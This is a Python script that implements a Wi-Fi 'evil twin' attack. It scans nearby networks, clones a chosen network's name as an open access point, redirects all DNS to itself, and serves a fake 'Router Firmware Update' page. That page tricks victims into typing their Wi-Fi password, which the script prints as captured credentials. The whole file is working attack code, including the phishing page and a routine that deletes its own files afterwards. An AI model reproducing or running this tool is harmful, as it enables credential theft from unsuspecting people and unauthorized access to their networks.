import os
import sys
import time
import csv
import subprocess
from http.server import SimpleHTTPRequestHandler, HTTPServer

# --- HARDWARE CONFIGURATION ---
INTERFACE = "wlp0s20f3"            # Your verified internal Wi-Fi card name
GATEWAY_IP = "192.168.4.1"         # Script gateway IP address
PORT = 80                          # Port for the captive portal web server
SCAN_CSV = "/tmp/air_scan"         # Temporary file to store network data

# --- HTML CAPTIVE PORTAL PAGE ---
HTML_CONTENT = """<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
        .box { background: white; padding: 30px; display: inline-block; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 300px; }
        input[type=password] { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; }
        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Router Firmware Update</h2>
        <p>A critical router security update is installing. Please re-enter your Wi-Fi password to restore connectivity.</p>
        <form action="/submit" method="POST">
            <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
            <button type="submit">Update Now</button>
        </form>
    </div>
</body>
</html>
"""

class CaptivePortalHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(HTML_CONTENT, "utf-8"))

    def do_POST(self):
        if self.path == "/submit":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            print("\n" + "="*40)
            print(f"[!] CREDENTIALS CAPTURED: {post_data}")
            print("="*40 + "\n")
            
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h2>Authentication successful. Reconnecting...</h2>")
        else:
            self.do_GET()

def kill_system_locks():
    print("[*] Releasing interface from NetworkManager and clearing ports...")
    subprocess.run(["sudo", "nmcli", "device", "set", INTERFACE, "managed", "no"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "killall", "dnsmasq"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("sudo fuser -k 53/udp 53/tcp 67/udp 80/tcp 2>/dev/null", shell=True)
    time.sleep(1)

def run_network_scan():
    print("[*] Initializing Wi-Fi card into Monitor Mode for scanning...")
    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"], check=True)
    subprocess.run(["sudo", "iw", INTERFACE, "set", "type", "monitor"], check=True)
    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"], check=True)

    # Clean previous scan files
    if os.path.exists(f"{SCAN_CSV}-01.csv"): os.remove(f"{SCAN_CSV}-01.csv")

    print("\n" + "="*60)
    print(" INSTRUCTIONS FOR SCAN POPUP WINDOW:")
    print(" 1. Watch the separate popup window find networks.")
    print(" 2. When you see your target network, click inside it and press CTRL+C.")
    print("="*60 + "\n")
    time.sleep(3)

    # Launch airodump-ng in an external xterm window exactly like Airgeddon does
    scan_proc = subprocess.Popen([
        "sudo", "xterm", "-geometry", "100x25", "-title", "Live Wireless Scan - Press Ctrl+C when ready", "-e",
        f"airodump-ng --write {SCAN_CSV} --output-format csv {INTERFACE}"
    ])
    scan_proc.wait() # Wait for user to close it with Ctrl+C

def parse_scan_results():
    networks = []
    target_file = f"{SCAN_CSV}-01.csv"
    
    if not os.path.exists(target_file):
        print("[-] Error: No scan data collected. Exiting.")
        sys.exit(1)

    with open(target_file, mode='r', errors='ignore') as f:
        reader = csv.reader(f)
        for row in reader:
            if not row or len(row) < 14: continue
            bssid = row[0].strip()
            # Stop parsing when we hit the Station (Client) list in the CSV
            if bssid == "Station MAC" or bssid == "": break
            if bssid == "BSSID": continue
            
            ssid = row[13].strip()
            channel = row[3].strip()
            
            if ssid and ssid != "":
                networks.append({"bssid": bssid, "ssid": ssid, "channel": channel})
    return networks

def prompt_target_selection(networks):
    if not networks:
        print("[-] No active SSIDs discovered during the scan. Restarting...")
        sys.exit(1)

    print("\n--- DISCOVERED WIRELESS TARGETS ---")
    for idx, net in enumerate(networks):
        print(f"[{idx}] SSID: {net['ssid']:<25} BSSID: {net['bssid']}  Channel: {net['channel']}")
    print("-----------------------------------")
    
    while True:
        try:
            choice = int(input("\nSelect the network number to target: "))
            if 0 <= choice < len(networks):
                return networks[choice]
        except ValueError:
            pass
        print("[-] Invalid selection. Choose a valid index number from the list.")

def deploy_access_point(ssid, channel):
    print(f"\n[*] Configuring interface back to Master Mode for: '{ssid}' on Channel {channel}...")
    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"], check=True)
    subprocess.run(["sudo", "iw", INTERFACE, "set", "type", "managed"], check=True)
    subprocess.run(["sudo", "ifconfig", INTERFACE, "up", GATEWAY_IP, "netmask", "255.255.255.0"], check=True)

    # Write customized hostapd configuration based on target selection
    hostapd_conf = f"""
interface={INTERFACE}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wmm_enabled=0
"""
    with open("hostapd.conf", "w") as f: f.write(hostapd_conf)

    # Write dnsmasq routing configuration
    dnsmasq_conf = f"""
interface={INTERFACE}
dhcp-range=192.168.4.2,192.168.4.50,255.255.255.0,12h
dhcp-option=3,{GATEWAY_IP}
dhcp-option=6,{GATEWAY_IP}
address=/#/{GATEWAY_IP}
"""
    with open("dnsmasq.conf", "w") as f: f.write(dnsmasq_conf)

def restore_system_defaults():
    print("\n[-] Restoring standard wireless card controls and system defaults...")
    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"])
    subprocess.run(["sudo", "iw", INTERFACE, "set", "type", "managed"])
    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"])
    subprocess.run(["sudo", "nmcli", "device", "set", INTERFACE, "managed", "yes"])
    subprocess.run(["sudo", "systemctl", "start", "systemd-resolved"])
    
    # Clean up file trails
    for f in ["hostapd.conf", "dnsmasq.conf", f"{SCAN_CSV}-01.csv"]:
        if os.path.exists(f): os.remove(f)
    print("[+] Cleanup complete. Everyday internet functionality restored.")

def main():
    if os.getuid() != 0:
        print("[-] Error: This script must be run as root (sudo).")
        sys.exit(1)

    try:
        # Step 1: Kill background locks to free port bounds
        kill_system_locks()
        
        # Step 2: Open an external xterm window to map local networks
        run_network_scan()
        
        # Step 3: Read scan artifacts and display the menu inside the terminal
        networks = parse_scan_results()
        target = prompt_target_selection(networks)
        
        # Step 4: Shut down monitor mode, switch to AP architecture configuration
        deploy_access_point(target['ssid'], target['channel'])

        print("[*] Igniting DHCP/DNS network routers...")
        dnsmasq_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", "dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        hostapd_proc = subprocess.Popen(["sudo", "hostapd", "hostapd.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(2)
        print(f"\n[+] Evil Twin simulation online! Broadcasting cloned network: '{target['ssid']}'")
        print("[*] Captive Portal server live on Port 80. Waiting for connections... (Press Ctrl+C to exit)\n")

        # Step 5: Host HTTP portal framework to harvest incoming strings
        server = HTTPServer((GATEWAY_IP, PORT), CaptivePortalHandler)
        server.serve_forever()

    except KeyboardInterrupt:
        pass
    finally:
        # Safety clean termination
        try: dnsmasq_proc.terminate()
        except: pass
        try: hostapd_proc.terminate()
        except: pass
        restore_system_defaults()

if __name__ == "__main__":
    main()
